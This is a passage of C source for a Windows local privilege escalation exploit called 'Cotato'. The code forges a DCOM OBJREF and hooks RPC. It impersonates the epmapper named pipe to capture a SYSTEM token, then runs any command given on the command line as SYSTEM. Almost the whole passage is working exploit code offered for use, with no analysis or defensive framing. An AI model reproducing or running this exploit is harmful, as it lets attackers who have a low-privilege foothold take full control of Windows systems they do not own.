    SIZE_T off = 0;
    if (origLen < 4+4+16+4+4+8+8+16) return NULL;

    UINT sig = ru32(orig, &off);
    if (sig != 0x574f454d) { fprintf(stderr,"[-] Bad OBJREF signature\n"); return NULL; }

    ru32(orig, &off); /* flags - consumed */
    off += 16;        /* skip source GUID */

    /* Standard fields */
    ru32(orig, &off); /* std_flags - consumed */
    ru32(orig, &off); /* public_refs - consumed */
    UINT64 oxid = ru64(orig, &off);
    UINT64 oid  = ru64(orig, &off);
    BYTE   ipid[16];
    memcpy(ipid, orig + off, 16); off += 16;

    printf("[+] OXID=0x%llx  OID=0x%llx\n",
           (unsigned long long)oxid, (unsigned long long)oid);

    /*
     * StringBinding:  tower(2) + "127.0.0.1"(9*2) + null(2) + pad(2) = 24 bytes
     * SecurityBinding: authn(2) + authz(2) + null(2) + pad(2)         =  8 bytes
     */
    static const char *ipStr = "127.0.0.1";
    SIZE_T ipLen    = 9;
    SIZE_T sbBytes  = 2 + ipLen*2 + 2 + 2; /* 24 */
    SIZE_T secBytes = 8;
    UINT16 numEntries     = (UINT16)((sbBytes + secBytes) / 2);
    UINT16 securityOffset = (UINT16)(sbBytes / 2);

    SIZE_T total = 4+4+16+4+4+8+8+16 + 2+2 + sbBytes + secBytes;
    BYTE *buf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total + 16);
    if (!buf) return NULL;

    SIZE_T p = 0;
    wu32(buf, &p, 0x574f454d);  /* signature */
    wu32(buf, &p, 1);           /* type = Standard */
    /* IUnknown GUID: 00000000-0000-0000-C000-000000000046 */
    wu32(buf, &p, 0x00000000);
    wu16(buf, &p, 0x0000);
    wu16(buf, &p, 0x0000);
    buf[p++]=0xC0; buf[p++]=0x00;
    memset(buf+p, 0, 5); p+=5;
    buf[p++]=0x46;
    /* Standard */
    wu32(buf, &p, 0);
    wu32(buf, &p, 1);
    wu64(buf, &p, oxid);
    wu64(buf, &p, oid);
    memcpy(buf+p, ipid, 16); p+=16;
    /* DualStringArray header */
    wu16(buf, &p, numEntries);
    wu16(buf, &p, securityOffset);
    /* StringBinding: tower = 0x07 (TCP) */
    wu16(buf, &p, 0x0007);
    for (SIZE_T i = 0; i < ipLen; i++) wu16(buf, &p, (UINT16)(unsigned char)ipStr[i]);
    wu16(buf, &p, 0);
    wu16(buf, &p, 0);
    /* SecurityBinding */
    wu16(buf, &p, 0x000a);
    wu16(buf, &p, 0xFFFF);
    wu16(buf, &p, 0);
    wu16(buf, &p, 0);

    *outLen = p;
    return buf;
}

static void UnmarshalObject(const BYTE *data, SIZE_T dataLen) {
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, dataLen);
    if (!hMem) return;
    PVOID p = GlobalLock(hMem);
    if (!p) { GlobalFree(hMem); return; }
    memcpy(p, data, dataLen);
    GlobalUnlock(hMem);

    IStream *pStream = NULL;
    HRESULT hr = _CreateStreamOnHGlobal(hMem, TRUE, &pStream);
    if (FAILED(hr)) { GlobalFree(hMem); return; }

    IUnknown *pUnk = NULL;
    hr = _CoUnmarshalInterface(pStream, &IID_IUnknown_val, (void**)&pUnk);
    if (SUCCEEDED(hr) && pUnk) pUnk->lpVtbl->Release(pUnk);
    pStream->lpVtbl->Release(pStream);
}

static BOOL TriggerUnmarshal(void) {
    HRESULT hr = _CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] CoInitializeEx failed: 0x%08X\n", hr);
        return FALSE;
    }

    IFakeUnknown fakeUnk;
    fakeUnk.lpVtbl   = &g_FakeVtbl;
    fakeUnk.refCount = 1;

    IMoniker *pMoniker = NULL;
    hr = _CreateObjrefMoniker((IUnknown*)&fakeUnk, &pMoniker);
    if (FAILED(hr) || !pMoniker) {
        fprintf(stderr, "[-] CreateObjrefMoniker failed: 0x%08X\n", hr);
        _CoUninitialize();
        return FALSE;
    }

    IBindCtx *pBC = NULL;
    hr = _CreateBindCtx_(0, &pBC);
    if (FAILED(hr) || !pBC) {
        pMoniker->lpVtbl->Release(pMoniker);
        _CoUninitialize();
        return FALSE;
    }

    LPOLESTR displayName = NULL;
    hr = pMoniker->lpVtbl->GetDisplayName(pMoniker, pBC, NULL, &displayName);
    pMoniker->lpVtbl->Release(pMoniker);
    pBC->lpVtbl->Release(pBC);

    if (FAILED(hr) || !displayName) {
        fprintf(stderr, "[-] GetDisplayName failed: 0x%08X\n", hr);
        _CoUninitialize();
        return FALSE;
    }

    char ansi[4096] = {0};
    WideCharToMultiByte(CP_ACP, 0, displayName, -1, ansi, sizeof(ansi)-1, NULL, NULL);
    CoTaskMemFree(displayName);

    /* Strip "objref:" prefix and trailing ":" */
    char *b64 = ansi;
    if (strncmp(b64, "objref:", 7) == 0) b64 += 7;
    SIZE_T b64Len = strlen(b64);
    while (b64Len > 0 && b64[b64Len-1] == ':') b64[--b64Len] = '\0';

    SIZE_T rawLen = 0;
    BYTE *raw = Base64Decode(b64, &rawLen);
    if (!raw) {
        fprintf(stderr, "[-] Base64 decode failed\n");
        _CoUninitialize();
        return FALSE;
    }

    SIZE_T newLen = 0;
    BYTE *newObjRef = BuildObjRef(raw, rawLen, &newLen);
    HeapFree(GetProcessHeap(), 0, raw);

    if (!newObjRef) {
        fprintf(stderr, "[-] BuildObjRef failed\n");
        _CoUninitialize();
        return FALSE;
    }

    printf("[+] Triggering DCOM unmarshal\n");
    UnmarshalObject(newObjRef, newLen);
    HeapFree(GetProcessHeap(), 0, newObjRef);

    _CoUninitialize();
    return TRUE;
}

static BOOL EnablePrivilege(const wchar_t *privName) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)
              && (GetLastError() == ERROR_SUCCESS);
    CloseHandle(hToken);
    if (ok)
        printf("[+] Enabled privilege: %ls\n", privName);
    else
        fprintf(stderr, "[!] Could not enable privilege %ls (may not be held)\n", privName);
    return ok;
}

static BOOL ExecuteCommand(HANDLE hToken, const wchar_t *cmdLine) {
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        fprintf(stderr, "[-] CreatePipe failed: %lu\n", GetLastError());
        return FALSE;
    }
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {0};
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;

    PROCESS_INFORMATION pi = {0};
    wchar_t cmdBuf[4096];
    wcsncpy(cmdBuf, cmdLine, 4095);
    cmdBuf[4095] = L'\0';

    BOOL ok = _CreateProcessWithTokenW(
        hToken, 0, NULL, cmdBuf,
        CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    );

    CloseHandle(hWritePipe);

    if (!ok) {
        fprintf(stderr, "[-] CreateProcessWithTokenW failed: %lu\n", GetLastError());
        CloseHandle(hReadPipe);
        return FALSE;
    }

    printf("[+] Process PID %lu – output:\n", pi.dwProcessId);

    char buf[1024];
    DWORD bytesRead;
    while (ReadFile(hReadPipe, buf, sizeof(buf)-1, &bytesRead, NULL) && bytesRead > 0) {
        buf[bytesRead] = '\0';
        printf("%s", buf);
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

int wmain(int argc, wchar_t *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %ls <command>\n", argv[0]);
        fprintf(stderr, "  e.g.: %ls \"cmd.exe /c whoami\"\n", argv[0]);
        return 1;
    }

    printf("[*] Cotato - command: %ls\n\n", argv[1]);

    if (!ResolveApis())   return 1;
    if (!ResolveCOMApis()) return 1;

    printf("\n[+] INITIALIZE CONTEXT\n");
    if (!InitContext()) return 1;

    printf("\n[+] INSTALL HOOK\n");
    if (!HookRpc()) return 1;

    printf("\n[+] START PIPE SERVER\n");
    PIPE_CTX pipeCtx = {0};
    lstrcpyW(pipeCtx.PipeName, L"\\\\.\\pipe\\Cotato\\pipe\\epmapper");
    pipeCtx.hReady = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!pipeCtx.hReady) { RestoreRpc(); return 1; }

    HANDLE hThread = CreateThread(NULL, 0, PipeServerThread, &pipeCtx, 0, NULL);
    if (!hThread) {
        fprintf(stderr, "[-] CreateThread failed: %lu\n", GetLastError());
        RestoreRpc();
        return 1;
    }

    printf("\n[+] TRIGGER DCOM UNMARSHAL\n");
    TriggerUnmarshal();

    printf("\n[+] Waiting for SYSTEM token (10s timeout)...\n");
    WaitForSingleObject(pipeCtx.hReady, 10000);

    printf("\n[+] RESTORE HOOK\n");
    RestoreRpc();

    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
    CloseHandle(pipeCtx.hReady);

    if (!pipeCtx.hSystemToken) {
        fprintf(stderr, "[-] Failed to obtain SYSTEM token\n");
        return 1;
    }

    printf("\n[+] EXECUTE COMMAND\n");
    /* Enable required privileges before CreateProcessWithTokenW */
    EnablePrivilege(SE_IMPERSONATE_NAME);
    EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);
    EnablePrivilege(SE_INCREASE_QUOTA_NAME);
    ExecuteCommand(pipeCtx.hSystemToken, argv[1]);

    _NtClose(pipeCtx.hSystemToken);
    printf("\n[*] Done.\n");
    return 0;
}
